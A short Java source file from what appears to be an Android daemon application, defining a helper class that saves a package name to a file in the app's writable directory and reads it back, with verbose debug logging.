package com.fx.maind.command.processor;

import com.fx.maind.ref.Customization;
import com.vvt.daemon.appengine.AppEngine;
import com.vvt.ioutil.Persister;
import com.vvt.logger.FxLog;

public class DaemonPackageNameManager {
	public static final String TAG = "DaemonPackageNameManager";
	public static final String FILE_NAME = "packagename";
	private static boolean LOGV = Customization.VERBOSE;
	
	public static void setPackageName(AppEngine appEngine, String packageName) {
		if (LOGV) FxLog.v(TAG, "setPackageName # ENTER ...");
		
		String path = String.format("%s/%s", appEngine.getWritablePath(), FILE_NAME);
		if (LOGV) FxLog.v(TAG, String.format("name is: %s, path is : %s ", packageName,  path));
		
		boolean isSuccess = Persister.persistObject(packageName, path);
		
		if(!isSuccess) {
			FxLog.e(TAG, "setPackageName failed");
		}
		else {
			if (LOGV) FxLog.v(TAG, "setPackageName success");
		}
		
		if (LOGV) FxLog.v(TAG, "setPackageName # EXIT ...");
	}
	
	public static String getPackageName(AppEngine appEngine) {
		String path = String.format("%s/%s", appEngine.getWritablePath(), FILE_NAME);
		return (String) Persister.deserializeToObject(path);
	}

}
